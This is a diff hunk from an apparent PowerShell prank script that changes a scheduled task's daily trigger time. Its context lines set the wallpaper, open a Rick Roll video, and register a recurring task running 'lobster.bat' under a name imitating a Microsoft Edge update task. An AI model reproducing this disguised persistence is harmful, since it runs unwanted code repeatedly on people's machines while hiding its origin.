@@ -28,7 +28,7 @@ namespace Win32{
 add-type $code
 [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
 $action = New-ScheduledTaskAction -Execute 'C:\temp\rickRoll-main\lobster.bat'  
-$trigger = New-ScheduledTaskTrigger -Daily -At 3pm
+$trigger = New-ScheduledTaskTrigger -Daily -At 1pm
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCore{32533}" -Description "Ear death"
 Start-Process msedge https://www.yout-ube.com/watch?v=dQw4w9WgXcQ
 Set-ExecutionPolicy -Scope CurrentUser Restricted
